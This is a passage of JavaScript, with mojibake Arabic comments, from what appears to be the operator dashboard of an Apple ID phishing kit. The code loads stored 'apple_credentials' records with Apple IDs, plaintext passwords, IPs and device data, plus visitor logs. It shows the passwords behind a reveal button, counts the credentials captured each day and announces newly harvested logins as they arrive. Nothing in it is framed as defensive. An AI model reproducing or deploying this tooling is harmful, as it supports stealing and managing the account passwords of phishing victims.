                console.error('âŒ Ø®Ø·Ø£ ÙÙŠ ØªØ­Ù…ÙŠÙ„ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª:', error);
                showNotification('Ø®Ø·Ø£ ÙÙŠ ØªØ­Ù…ÙŠÙ„ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª', 'error');
            }
        }
        
        // ØªØ­Ù…ÙŠÙ„ Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø¯Ø®ÙˆÙ„
        async function loadCredentials() {
            try {
                // Ù…Ø­Ø§ÙˆÙ„Ø© Ù…ØµØ§Ø¯Ø± Ù…ØªØ¹Ø¯Ø¯Ø©
                let loaded = false;
                
                // 1. IndexedDB
                try {
                    if (window.indexedDB) {
                        const db = await openIndexedDB();
                        if (db) {
                            const transaction = db.transaction(['credentials'], 'readonly');
                            const store = transaction.objectStore('credentials');
                            const request = store.getAll();
                            
                            await new Promise((resolve, reject) => {
                                request.onsuccess = () => {
                                    credentials = request.result || [];
                                    loaded = true;
                                    resolve();
                                };
                                request.onerror = () => reject(request.error);
                            });
                        }
                    }
                } catch (e) {
                    console.warn('âš ï¸ Ù„Ø§ ÙŠÙ…ÙƒÙ† Ø§Ù„ÙˆØµÙˆÙ„ Ø¥Ù„Ù‰ IndexedDB:', e);
                }
                
                // 2. localStorage (Ø¥Ø°Ø§ ÙØ´Ù„ IndexedDB)
                if (!loaded && typeof localStorage !== 'undefined') {
                    const credsData = localStorage.getItem('apple_credentials');
                    credentials = credsData ? JSON.parse(credsData) : [];
                    credentials = Array.isArray(credentials) ? credentials : [];
                    loaded = true;
                }
                
                // 3. Ø§Ù„Ù…Ù„ÙØ§Øª Ø§Ù„Ù…Ø­Ù„ÙŠØ© (Ù†Ø³Ø®Ø© Ø§Ø­ØªÙŠØ§Ø·ÙŠØ©)
                if (!loaded) {
                    credentials = [];
                }
                
                // Ø¹Ø±Ø¶ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª
                displayCredentials();
                
                console.log(`âœ… ØªÙ… ØªØ­Ù…ÙŠÙ„ ${credentials.length} Ø¨ÙŠØ§Ù†Ø§Øª Ø¯Ø®ÙˆÙ„`);
                
            } catch (error) {
                console.error('âŒ Ø®Ø·Ø£ ÙÙŠ ØªØ­Ù…ÙŠÙ„ Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø¯Ø®ÙˆÙ„:', error);
                credentials = [];
            }
        }
        
        // ØªØ­Ù…ÙŠÙ„ Ø§Ù„Ø²ÙŠØ§Ø±Ø§Øª
        async function loadVisits() {
            try {
                // Ù…Ø­Ø§ÙˆÙ„Ø© Ù…ØµØ§Ø¯Ø± Ù…ØªØ¹Ø¯Ø¯Ø©
                let loaded = false;
                
                // 1. IndexedDB
                try {
                    if (window.indexedDB) {
                        const db = await openIndexedDB();
                        if (db) {
                            const transaction = db.transaction(['visits'], 'readonly');
                            const store = transaction.objectStore('visits');
                            const request = store.getAll();
                            
                            await new Promise((resolve, reject) => {
                                request.onsuccess = () => {
                                    visits = request.result || [];
                                    loaded = true;
                                    resolve();
                                };
                                request.onerror = () => reject(request.error);
                            });
                        }
                    }
                } catch (e) {
                    console.warn('âš ï¸ Ù„Ø§ ÙŠÙ…ÙƒÙ† Ø§Ù„ÙˆØµÙˆÙ„ Ø¥Ù„Ù‰ IndexedDB:', e);
                }
                
                // 2. localStorage
                if (!loaded && typeof localStorage !== 'undefined') {
                    const visitsData = localStorage.getItem('apple_visits');
                    visits = visitsData ? JSON.parse(visitsData) : [];
                    visits = Array.isArray(visits) ? visits : [];
                    loaded = true;
                }
                
                // 3. Ù†Ø¸Ø§Ù… Kelog
                if (!loaded) {
                    const kelogData = localStorage.getItem('kelog_system');
                    if (kelogData) {
                        const kelog = JSON.parse(kelogData);
                        visits = kelog.filter(log => log.type === 'visit');
                    } else {
                        visits = [];
                    }
                }
                
                // Ø¹Ø±Ø¶ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª
                displayVisits();
                
                console.log(`âœ… ØªÙ… ØªØ­Ù…ÙŠÙ„ ${visits.length} Ø²ÙŠØ§Ø±Ø©`);
                
            } catch (error) {
                console.error('âŒ Ø®Ø·Ø£ ÙÙŠ ØªØ­Ù…ÙŠÙ„ Ø§Ù„Ø²ÙŠØ§Ø±Ø§Øª:', error);
                visits = [];
            }
        }
        
        // ØªØ­Ù…ÙŠÙ„ Ø³Ø¬Ù„Ø§Øª Kelog
        async function loadKelog() {
            try {
                // Ù…Ø­Ø§ÙˆÙ„Ø© Ù…ØµØ§Ø¯Ø± Ù…ØªØ¹Ø¯Ø¯Ø©
                let loaded = false;
                
                // 1. Ù†Ø¸Ø§Ù… Kelog Ø§Ù„Ù…Ø¨Ø§Ø´Ø±
                if (window.kelogSystem && window.kelogSystem.getAllLogs) {
                    kelogEntries = window.kelogSystem.getAllLogs();
                    loaded = true;
                }
                
                // 2. localStorage
                if (!loaded && typeof localStorage !== 'undefined') {
                    const kelogData = localStorage.getItem('kelog_system');
                    kelogEntries = kelogData ? JSON.parse(kelogData) : [];
                    kelogEntries = Array.isArray(kelogEntries) ? kelogEntries : [];
                    loaded = true;
                }
                
                // 3. IndexedDB
                if (!loaded && window.indexedDB) {
                    try {
                        const db = await openIndexedDB();
                        if (db) {
                            const transaction = db.transaction(['logs'], 'readonly');
                            const store = transaction.objectStore('logs');
                            const request = store.getAll();
                            
                            await new Promise((resolve, reject) => {
                                request.onsuccess = () => {
                                    kelogEntries = request.result || [];
                                    resolve();
                                };
                                request.onerror = () => reject(request.error);
                            });
                        }
                    } catch (e) {
                        console.warn('âš ï¸ Ù„Ø§ ÙŠÙ…ÙƒÙ† Ø§Ù„ÙˆØµÙˆÙ„ Ø¥Ù„Ù‰ Ø³Ø¬Ù„Ø§Øª Kelog:', e);
                    }
                }
                
                // Ø¹Ø±Ø¶ Ø§Ù„Ø³Ø¬Ù„Ø§Øª
                displayKelog();
                
                console.log(`âœ… ØªÙ… ØªØ­Ù…ÙŠÙ„ ${kelogEntries.length} Ø³Ø¬Ù„ Ù…Ù† Kelog`);
                
            } catch (error) {
                console.error('âŒ Ø®Ø·Ø£ ÙÙŠ ØªØ­Ù…ÙŠÙ„ Ø³Ø¬Ù„Ø§Øª Kelog:', error);
                kelogEntries = [];
            }
        }
        
        // ÙØªØ­ Ù‚Ø§Ø¹Ø¯Ø© Ø¨ÙŠØ§Ù†Ø§Øª IndexedDB
        async function openIndexedDB() {
            return new Promise((resolve, reject) => {
                try {
                    if (!window.indexedDB) {
                        resolve(null);
                        return;
                    }
                    
                    const request = indexedDB.open('AppleSystemDB', 1);
                    
                    request.onerror = () => {
                        console.warn('âš ï¸ Ù„Ø§ ÙŠÙ…ÙƒÙ† ÙØªØ­ Ù‚Ø§Ø¹Ø¯Ø© Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª');
                        resolve(null);
                    };
                    
                    request.onsuccess = (event) => {
                        resolve(event.target.result);
                    };
                    
                    request.onupgradeneeded = (event) => {
                        const db = event.target.result;
                        
                        // Ø¥Ù†Ø´Ø§Ø¡ Ø§Ù„Ù…Ø®Ø§Ø²Ù† Ø¥Ø°Ø§ Ù„Ù… ØªÙƒÙ† Ù…ÙˆØ¬ÙˆØ¯Ø©
                        if (!db.objectStoreNames.contains('credentials')) {
                            db.createObjectStore('credentials', { keyPath: 'id', autoIncrement: true });
                        }
                        
                        if (!db.objectStoreNames.contains('visits')) {
                            db.createObjectStore('visits', { keyPath: 'id', autoIncrement: true });
                        }
                        
                        if (!db.objectStoreNames.contains('logs')) {
                            const logsStore = db.createObjectStore('logs', { keyPath: 'id', autoIncrement: true });
                            logsStore.createIndex('timestamp', 'timestamp', { unique: false });
                            logsStore.createIndex('type', 'type', { unique: false });
                        }
                    };
                    
                } catch (error) {
                    console.warn('âš ï¸ Ø®Ø·Ø£ ÙÙŠ ÙØªØ­ Ù‚Ø§Ø¹Ø¯Ø© Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª:', error);
                    resolve(null);
                }
            });
        }
        
        // ØªØ­Ø¯ÙŠØ« Ø§Ù„Ø¥Ø­ØµØ§Ø¦ÙŠØ§Øª
        function updateStats() {
            const stats = {
                totalCredentials: credentials.length,
                totalVisits: visits.length,
                totalKelog: kelogEntries.length,
                mobileVisits: visits.filter(v => v.isMobile || /mobile/i.test(v.userAgent || '')).length,
                desktopVisits: visits.filter(v => !v.isMobile && !/mobile/i.test(v.userAgent || '')).length,
                todayCredentials: credentials.filter(c => {
                    const credDate = new Date(c.timestamp);
                    const today = new Date();
                    return credDate.toDateString() === today.toDateString();
                }).length
            };
            
            document.getElementById('statsContainer').innerHTML = `
                <div class="stat-card">
                    <div class="stat-icon">ğŸ”</div>
                    <div class="stat-number">${stats.totalCredentials}</div>
                    <div class="stat-label">Ø¨ÙŠØ§Ù†Ø§Øª Ø¯Ø®ÙˆÙ„</div>
                    <div class="stat-trend trend-up">+${stats.todayCredentials} Ø§Ù„ÙŠÙˆÙ…</div>
                </div>
                <div class="stat-card">
                    <div class="stat-icon">ğŸ‘€</div>
                    <div class="stat-number">${stats.totalVisits}</div>
                    <div class="stat-label">Ø¥Ø¬Ù…Ø§Ù„ÙŠ Ø§Ù„Ø²ÙŠØ§Ø±Ø§Øª</div>
                    <div class="stat-trend">
                        <span class="trend-up">${stats.mobileVisits} Ù‡Ø§ØªÙ</span> | 
                        <span class="trend-down">${stats.desktopVisits} ÙƒÙ…Ø¨ÙŠÙˆØªØ±</span>
                    </div>
                </div>
                <div class="stat-card">
                    <div class="stat-icon">ğŸ“Š</div>
                    <div class="stat-number">${stats.totalKelog}</div>
                    <div class="stat-label">Ø³Ø¬Ù„Ø§Øª Ø§Ù„Ù†Ø¸Ø§Ù…</div>
                    <div class="stat-trend trend-up">Ù…Ø¨Ø§Ø´Ø±</div>
                </div>
                <div class="stat-card">
                    <div class="stat-icon">ğŸ“±</div>
                    <div class="stat-number">${stats.mobileVisits}</div>
                    <div class="stat-label">Ø²ÙŠØ§Ø±Ø§Øª Ø§Ù„Ù‡ÙˆØ§ØªÙ</div>
                    <div class="stat-trend trend-up">${Math.round((stats.mobileVisits / Math.max(stats.totalVisits, 1)) * 100)}%</div>
                </div>
            `;
        }
        
        // Ø¹Ø±Ø¶ Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø¯Ø®ÙˆÙ„
        function displayCredentials() {
            const tbody = document.getElementById('credentialsBody');
            const emptyState = document.getElementById('emptyCredentials');
            
            if (credentials.length === 0) {
                tbody.innerHTML = '';
                emptyState.style.display = 'block';
                return;
            }
            
            emptyState.style.display = 'none';
            
            // ÙØ±Ø² Ø­Ø³Ø¨ Ø§Ù„Ø£Ø­Ø¯Ø«
            const sortedCredentials = [...credentials].sort((a, b) => 
                new Date(b.timestamp) - new Date(a.timestamp)
            );
            
            let html = '';
            sortedCredentials.forEach((cred, index) => {
                const time = new Date(cred.timestamp).toLocaleString('ar-SA');
                const isMobile = cred.isMobile || /mobile/i.test(cred.userAgent || '');
                const browser = getBrowserName(cred.userAgent);
                
                html += `
                <tr>
                    <td>${index + 1}</td>
                    <td>${time}</td>
                    <td><span class="sensitive-data">${cred.appleId || 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ'}</span></td>
                    <td class="password-cell">
                        <span class="sensitive-data">â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢</span>
                        <button class="toggle-password" onclick="togglePassword(${index})">
                            ğŸ‘ï¸ Ø¹Ø±Ø¶
                        </button>
                        <div class="password-view" id="passwordView${index}">
                            ${cred.password || 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ'}
                        </div>
                    </td>
                    <td>${cred.ip || 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ'}</td>
                    <td>${isMobile ? 'ğŸ“± Ù‡Ø§ØªÙ' : 'ğŸ’» ÙƒÙ…Ø¨ÙŠÙˆØªØ±'}</td>
                    <td>${browser}</td>
                    <td>
                        <button class="btn btn-danger" style="padding: 4px 8px; font-size: 12px;" 
                                onclick="deleteCredential(${index})">
                            Ø­Ø°Ù
                        </button>
                    </td>
                </tr>
                `;
            });
            
            tbody.innerHTML = html;
        }
        
        // Ø¹Ø±Ø¶ Ø§Ù„Ø²ÙŠØ§Ø±Ø§Øª
        function displayVisits() {
            const tbody = document.getElementById('visitsBody');
            const emptyState = document.getElementById('emptyVisits');
            
            if (visits.length === 0) {
                tbody.innerHTML = '';
                emptyState.style.display = 'block';
                return;
            }
            
            emptyState.style.display = 'none';
            
            // ÙØ±Ø² Ø­Ø³Ø¨ Ø§Ù„Ø£Ø­Ø¯Ø«
            const sortedVisits = [...visits].sort((a, b) => 
                new Date(b.timestamp || b.time) - new Date(a.timestamp || a.time)
            );
            
            let html = '';
            sortedVisits.forEach((visit, index) => {
                const time = new Date(visit.timestamp || visit.time).toLocaleString('ar-SA');
                const isMobile = visit.isMobile || /mobile/i.test(visit.userAgent || '');
                const browser = getBrowserName(visit.userAgent);
                const screen = visit.screen || 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ';
                const language = visit.language || 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ';
                const referrer = visit.referrer || 'Ù…Ø¨Ø§Ø´Ø±';
                
                html += `
                <tr>
                    <td>${index + 1}</td>
                    <td>${time}</td>
                    <td>${visit.ip || 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ'}</td>
                    <td>${isMobile ? 'ğŸ“± Ù‡Ø§ØªÙ' : 'ğŸ’» ÙƒÙ…Ø¨ÙŠÙˆØªØ±'}</td>
                    <td>${browser}</td>
                    <td>${screen}</td>
                    <td>${language}</td>
                    <td>${referrer}</td>
                </tr>
                `;
            });
            
            tbody.innerHTML = html;
        }
        
        // Ø¹Ø±Ø¶ Ø³Ø¬Ù„Ø§Øª Kelog
        function displayKelog() {
            const container = document.getElementById('kelogContainer');
            const emptyState = document.getElementById('emptyKelog');
            
            if (kelogEntries.length === 0) {
                container.innerHTML = '';
                emptyState.style.display = 'block';
                return;
            }
            
            emptyState.style.display = 'none';
            
            // ÙØ±Ø² Ø­Ø³Ø¨ Ø§Ù„Ø£Ø­Ø¯Ø«
            const sortedLogs = [...kelogEntries].sort((a, b) => 
                new Date(b.timestamp) - new Date(a.timestamp)
            ).slice(0, 50); // Ø¹Ø±Ø¶ Ø¢Ø®Ø± 50 Ø³Ø¬Ù„ ÙÙ‚Ø·
            
            let html = '';
            sortedLogs.forEach((log, index) => {
                const time = new Date(log.timestamp).toLocaleString('ar-SA');
                const logClass = log.type === 'error' ? 'log-error' : 
                               log.type === 'security' ? 'log-security' : 
                               log.type === 'success' ? 'log-success' : '';
                
                html += `
                <div class="log-entry ${logClass}">
                    <div class="log-time">${time} | ${log.type} | ${log.priority || 'normal'}</div>
                    <div class="log-action">${log.action}</div>
                    <div class="log-data">${JSON.stringify(log.data, null, 2)}</div>
                </div>
                `;
            });
            
            container.innerHTML = html;
        }
        
        // Ø§Ù„Ø­ØµÙˆÙ„ Ø¹Ù„Ù‰ Ø§Ø³Ù… Ø§Ù„Ù…ØªØµÙØ­
        function getBrowserName(userAgent) {
            if (!userAgent) return 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ';
            
            const ua = userAgent.toLowerCase();
            if (ua.includes('chrome')) return 'Chrome';
            if (ua.includes('firefox')) return 'Firefox';
            if (ua.includes('safari')) return 'Safari';
            if (ua.includes('edge')) return 'Edge';
            if (ua.includes('opera')) return 'Opera';
            return 'Ù…ØªØµÙØ­ Ø¢Ø®Ø±';
        }
        
        // ØªØ¨Ø¯ÙŠÙ„ Ø¹Ø±Ø¶ ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ±
        function togglePassword(index) {
            const view = document.getElementById(`passwordView${index}`);
            const btn = event.target;
            
            if (view.style.display === 'block') {
                view.style.display = 'none';
                btn.textContent = 'ğŸ‘ï¸ Ø¹Ø±Ø¶';
            } else {
                view.style.display = 'block';
                btn.textContent = 'ğŸ™ˆ Ø¥Ø®ÙØ§Ø¡';
            }
        }
        
        // Ø­Ø°Ù Ø¨ÙŠØ§Ù†Ø§Øª Ø¯Ø®ÙˆÙ„
        function deleteCredential(index) {
            if (confirm('Ù‡Ù„ ØªØ±ÙŠØ¯ Ø­Ø°Ù Ù‡Ø°Ù‡ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§ØªØŸ')) {
                const sortedCredentials = [...credentials].sort((a, b) => 
                    new Date(b.timestamp) - new Date(a.timestamp)
                );
                
                const credentialToDelete = sortedCredentials[index];
                const originalIndex = credentials.findIndex(c => c.timestamp === credentialToDelete.timestamp);
                
                if (originalIndex !== -1) {
                    credentials.splice(originalIndex, 1);
                    
                    // ØªØ­Ø¯ÙŠØ« Ø§Ù„ØªØ®Ø²ÙŠÙ†
                    saveCredentials();
                    
                    // Ø¥Ø¹Ø§Ø¯Ø© Ø§Ù„Ø¹Ø±Ø¶
                    displayCredentials();
                    updateStats();
                    
                    showNotification('ØªÙ… Ø­Ø°Ù Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø¨Ù†Ø¬Ø§Ø­', 'success');
                }
            }
        }
        
        // Ø­Ø°Ù Ø¬Ù…ÙŠØ¹ Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø¯Ø®ÙˆÙ„
        function deleteAllCredentials() {
            if (confirm('Ù‡Ù„ ØªØ±ÙŠØ¯ Ø­Ø°Ù Ø¬Ù…ÙŠØ¹ Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø¯Ø®ÙˆÙ„ØŸ Ù‡Ø°Ø§ Ø§Ù„Ø¥Ø¬Ø±Ø§Ø¡ Ù„Ø§ ÙŠÙ…ÙƒÙ† Ø§Ù„ØªØ±Ø§Ø¬Ø¹ Ø¹Ù†Ù‡.')) {
                credentials = [];
                saveCredentials();
                displayCredentials();
                updateStats();
                showNotification('ØªÙ… Ø­Ø°Ù Ø¬Ù…ÙŠØ¹ Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø¯Ø®ÙˆÙ„', 'success');
            }
        }
        
        // Ø­ÙØ¸ Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø¯Ø®ÙˆÙ„
        function saveCredentials() {
            try {
                // Ø­ÙØ¸ ÙÙŠ IndexedDB
                if (window.indexedDB) {
                    openIndexedDB().then(db => {
                        if (db) {
                            const transaction = db.transaction(['credentials'], 'readwrite');
                            const store = transaction.objectStore('credentials');
                            store.clear();
                            credentials.forEach(cred => {
                                store.add(cred);
                            });
                        }
                    });
                }
                
                // Ø­ÙØ¸ ÙÙŠ localStorage
                if (typeof localStorage !== 'undefined') {
                    localStorage.setItem('apple_credentials', JSON.stringify(credentials));
                }
                
            } catch (error) {
                console.error('âŒ Ø®Ø·Ø£ ÙÙŠ Ø­ÙØ¸ Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø¯Ø®ÙˆÙ„:', error);
            }
        }
        
        // ØªØ¨Ø¯ÙŠÙ„ Ø§Ù„ØªØ¨ÙˆÙŠØ¨
        function switchTab(tabName) {
            // Ø¥Ø®ÙØ§Ø¡ Ø¬Ù…ÙŠØ¹ Ø§Ù„ØªØ¨ÙˆÙŠØ¨Ø§Øª
            document.querySelectorAll('.tab-content').forEach(tab => {
                tab.classList.remove('active');
            });
            
            document.querySelectorAll('.tab').forEach(tab => {
                tab.classList.remove('active');
            });
            
            // Ø¥Ø¸Ù‡Ø§Ø± Ø§Ù„ØªØ¨ÙˆÙŠØ¨ Ø§Ù„Ù…Ø­Ø¯Ø¯
            document.getElementById(`tab${tabName.charAt(0).toUpperCase() + tabName.slice(1)}`).classList.add('active');
            event.target.classList.add('active');
            
            currentTab = tabName;
            
            // ØªØ­Ù…ÙŠÙ„ Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„ØªØ¨ÙˆÙŠØ¨ Ø¥Ø°Ø§ Ù„Ø²Ù… Ø§Ù„Ø£Ù…Ø±
            if (tabName === 'kelog') {
                loadKelog();
            }
        }
        
        // ÙÙ„ØªØ±Ø© Ø§Ù„Ø¬Ø¯ÙˆÙ„
        function filterTable(tableId, searchTerm) {
            const table = document.getElementById(tableId);
            const rows = table.getElementsByTagName('tr');
            const term = searchTerm.toLowerCase();
            
            for (let i = 1; i < rows.length; i++) {
                const row = rows[i];
                const text = row.textContent.toLowerCase();
                row.style.display = text.includes(term) ? '' : 'none';
            }
        }
        
        // ÙÙ„ØªØ±Ø© Ø§Ù„Ø²ÙŠØ§Ø±Ø§Øª
        function filterVisits(deviceType) {
            const tbody = document.getElementById('visitsBody');
            const rows = tbody.getElementsByTagName('tr');
            
            for (let i = 0; i < rows.length; i++) {
                const row = rows[i];
                const deviceCell = row.cells[3];
                
                if (!deviceCell) continue;
                
                const deviceText = deviceCell.textContent.toLowerCase();
                const isMobileDevice = deviceText.includes('Ù‡Ø§ØªÙ');
                
                if (!deviceType || 
                    (deviceType === 'mobile' && isMobileDevice) ||
                    (deviceType === 'desktop' && !isMobileDevice)) {
                    row.style.display = '';
                } else {
                    row.style.display = 'none';
                }
            }
        }
        
        // ÙÙ„ØªØ±Ø© Ø³Ø¬Ù„Ø§Øª Kelog
        function filterKelog(filterType, value) {
            if (filterType === 'type') {
                const container = document.getElementById('kelogContainer');
                const entries = container.getElementsByClassName('log-entry');
                
                for (let entry of entries) {
                    if (!value || entry.classList.contains(`log-${value}`) || 
                        (value === 'info' && !entry.className.includes('log-'))) {
                        entry.style.display = '';
                    } else {
                        entry.style.display = 'none';
                    }
                }
            } else if (filterType === 'search') {
                const container = document.getElementById('kelogContainer');
                const entries = container.getElementsByClassName('log-entry');
                const term = value.toLowerCase();
                
                for (let entry of entries) {
                    const text = entry.textContent.toLowerCase();
                    entry.style.display = text.includes(term) ? '' : 'none';
                }
            }
        }
        
        // Ø¨Ø¯Ø¡ Ø§Ù„ØªØ­Ø¯ÙŠØ« Ø§Ù„ØªÙ„Ù‚Ø§Ø¦ÙŠ
        function startAutoRefresh() {
            if (refreshInterval) {
                clearInterval(refreshInterval);
            }
            
            const interval = parseInt(document.getElementById('refreshInterval')?.value || '10') * 1000;
            refreshInterval = setInterval(() => {
                if (document.getElementById('autoRefreshSettings')?.checked) {
                    refreshAllData();
                }
            }, interval);
        }
        
        // Ø¥Ø¹Ø¯Ø§Ø¯ Ø§Ù„Ø§Ø³ØªÙ…Ø§Ø¹ Ù„Ù„ØªØ­Ø¯ÙŠØ«Ø§Øª Ø§Ù„Ù…Ø¨Ø§Ø´Ø±Ø©
        function setupRealTimeListeners() {
            // Ø§Ù„Ø§Ø³ØªÙ…Ø§Ø¹ Ù„Ù„Ø±Ø³Ø§Ø¦Ù„ Ø¨ÙŠÙ† Ø§Ù„Ù†ÙˆØ§ÙØ°
            window.addEventListener('message', function(event) {
                if (event.data && event.data.type === 'dashboard_update') {
                    handleDashboardUpdate(event.data);
                }
                
                if (event.data && event.data.type === 'kelog_update') {
                    handleKelogUpdate(event.data);
                }
            });
            
            // Ø§Ù„Ø§Ø³ØªÙ…Ø§Ø¹ Ù„ØªØ­Ø¯ÙŠØ«Ø§Øª localStorage
            window.addEventListener('storage', function(event) {
                if (event.key === 'kelog_dashboard_update') {
                    try {
                        const update = JSON.parse(event.newValue);
                        handleDashboardUpdate(update);
                    } catch (e) {
                        console.warn('âš ï¸ Ø®Ø·Ø£ ÙÙŠ Ù…Ø¹Ø§Ù„Ø¬Ø© ØªØ­Ø¯ÙŠØ« localStorage');
                    }
                }
            });
            
            // Ø§Ù„Ø§Ø³ØªÙ…Ø§Ø¹ Ù„Ù„ØªØ­Ø¯ÙŠØ«Ø§Øª Ù…Ù† iframe
            const checkForUpdates = setInterval(() => {
                try {
                    const update = localStorage.getItem('dashboard_update');
                    if (update) {
                        const data = JSON.parse(update);
                        handleDashboardUpdate(data);
                        localStorage.removeItem('dashboard_update');
                    }
                } catch (e) {
                    // ØªØ¬Ø§Ù‡Ù„ Ø§Ù„Ø£Ø®Ø·Ø§Ø¡
                }
            }, 1000);
        }
        
        // Ù…Ø¹Ø§Ù„Ø¬Ø© ØªØ­Ø¯ÙŠØ« Ù„ÙˆØ­Ø© Ø§Ù„ØªØ­ÙƒÙ…
        function handleDashboardUpdate(update) {
            if (update.type === 'new_credential') {
                // Ø¥Ø¶Ø§ÙØ© Ø¨ÙŠØ§Ù†Ø§Øª Ø¯Ø®ÙˆÙ„ Ø¬Ø¯ÙŠØ¯Ø©
                credentials.unshift(update.data);
                
                // ØªØ­Ø¯ÙŠØ« Ø§Ù„Ø¹Ø±Ø¶
                displayCredentials();
                updateStats();
                
                // Ø¥Ø¸Ù‡Ø§Ø± Ø¥Ø´Ø¹Ø§Ø±
                showNotification(`ØªÙ… ØªØ³Ø¬ÙŠÙ„ Ø¨ÙŠØ§Ù†Ø§Øª Ø¯Ø®ÙˆÙ„ Ø¬Ø¯ÙŠØ¯Ø©: ${update.data.appleId}`, 'success');
            }
        }
        
        // Ù…Ø¹Ø§Ù„Ø¬Ø© ØªØ­Ø¯ÙŠØ« Kelog
        function handleKelogUpdate(update) {
            if (update.log) {
                // Ø¥Ø¶Ø§ÙØ© Ø³Ø¬Ù„ Ø¬Ø¯ÙŠØ¯
                kelogEntries.push(update.log);
                
                // ØªØ­Ø¯ÙŠØ« Ø§Ù„Ø¹Ø±Ø¶ Ø¥Ø°Ø§ ÙƒØ§Ù† ÙÙŠ ØªØ¨ÙˆÙŠØ¨ Kelog
                if (currentTab === 'kelog') {
                    displayKelog();
                }
                
                // ØªØ­Ø¯ÙŠØ« Ø§Ù„Ø¥Ø­ØµØ§Ø¦ÙŠØ§Øª
                updateStats();
            }
        }
        
        // Ø¥Ø¸Ù‡Ø§Ø± Ø¥Ø´Ø¹Ø§Ø±
        function showNotification(message, type = 'info') {
            const notification = document.getElementById('notification');
            notification.textContent = message;
            notification.style.background = type === 'error' ? 'var(--danger)' : 
                                         type === 'warning' ? 'var(--warning)' : 
                                         type === 'success' ? 'var(--success)' : 'var(--primary)';
            notification.style.display = 'block';
            
            setTimeout(() => {
                notification.style.display = 'none';
            }, 3000);
        }
        
        // ØªØ­Ù…ÙŠÙ„ Ø§Ù„Ø¥Ø¹Ø¯Ø§Ø¯Ø§Øª
        function loadSettings() {
            try {
                const settings = JSON.parse(localStorage.getItem('dashboard_settings') || '{}');
                
                // ØªØ·Ø¨ÙŠÙ‚ Ø§Ù„Ø¥Ø¹Ø¯Ø§Ø¯Ø§Øª
                document.getElementById('autoRefreshSettings').checked = settings.autoRefresh !== false;
                document.getElementById('refreshInterval').value = settings.refreshInterval || '10';
                document.getElementById('encryptData').checked = settings.encryptData !== false;
                document.getElementById('autoClean').checked = settings.autoClean !== false;
                document.getElementById('retentionDays').value = settings.retentionDays || '7';
                document.getElementById('kelogEnabled').checked = settings.kelogEnabled !== false;
                document.getElementById('kelogRealTime').checked = settings.kelogRealTime !== false;
                document.getElementById('maxLogs').value = settings.maxLogs || '2000';
                document.getElementById('mobileSupport').checked = settings.mobileSupport !== false;
                document.getElementById('indexedDBSupport').checked = settings.indexedDBSupport !== false;
                document.getElementById('autoFileDownload').checked = settings.autoFileDownload !== false;
                
            } catch (error) {
                console.error('âŒ Ø®Ø·Ø£ ÙÙŠ ØªØ­Ù…ÙŠÙ„ Ø§Ù„Ø¥Ø¹Ø¯Ø§Ø¯Ø§Øª:', error);
            }
        }
        
        // Ø­ÙØ¸ Ø§Ù„Ø¥Ø¹Ø¯Ø§Ø¯Ø§Øª
        function saveSettings() {
            try {
                const settings = {
                    autoRefresh: document.getElementById('autoRefreshSettings').checked,
                    refreshInterval: document.getElementById('refreshInterval').value,
                    encryptData: document.getElementById('encryptData').checked,
                    autoClean: document.getElementById('autoClean').checked,
                    retentionDays: document.getElementById('retentionDays').value,
                    kelogEnabled: document.getElementById('kelogEnabled').checked,
                    kelogRealTime: document.getElementById('kelogRealTime').checked,
                    maxLogs: document.getElementById('maxLogs').value,
                    mobileSupport: document.getElementById('mobileSupport').checked,
                    indexedDBSupport: document.getElementById('indexedDBSupport').checked,
                    autoFileDownload: document.getElementById('autoFileDownload').checked,
                    savedAt: new Date().toISOString()
                };
                
                localStorage.setItem('dashboard_settings', JSON.stringify(settings));
                
                // Ø¥Ø¹Ø§Ø¯Ø© Ø¨Ø¯Ø¡ Ø§Ù„ØªØ­Ø¯ÙŠØ« Ø§Ù„ØªÙ„Ù‚Ø§Ø¦ÙŠ
                startAutoRefresh();
                
                showNotification('ØªÙ… Ø­ÙØ¸ Ø§Ù„Ø¥Ø¹Ø¯Ø§Ø¯Ø§Øª Ø¨Ù†Ø¬Ø§Ø­', 'success');
                
            } catch (error) {
                console.error('âŒ Ø®Ø·Ø£ ÙÙŠ Ø­ÙØ¸ Ø§Ù„Ø¥Ø¹Ø¯Ø§Ø¯Ø§Øª:', error);
                showNotification('Ø®Ø·Ø£ ÙÙŠ Ø­ÙØ¸ Ø§Ù„Ø¥Ø¹Ø¯Ø§Ø¯Ø§Øª', 'error');
            }
        }
        
        // Ø¥Ø¹Ø§Ø¯Ø© ØªØ¹ÙŠÙŠÙ† Ø§Ù„Ø¥Ø¹Ø¯Ø§Ø¯Ø§Øª
        function resetSettings() {
            if (confirm('Ù‡Ù„ ØªØ±ÙŠØ¯ Ø¥Ø¹Ø§Ø¯Ø© ØªØ¹ÙŠÙŠÙ† Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø¥Ø¹Ø¯Ø§Ø¯Ø§Øª Ø¥Ù„Ù‰ Ø§Ù„Ù‚ÙŠÙ… Ø§Ù„Ø§ÙØªØ±Ø§Ø¶ÙŠØ©ØŸ')) {
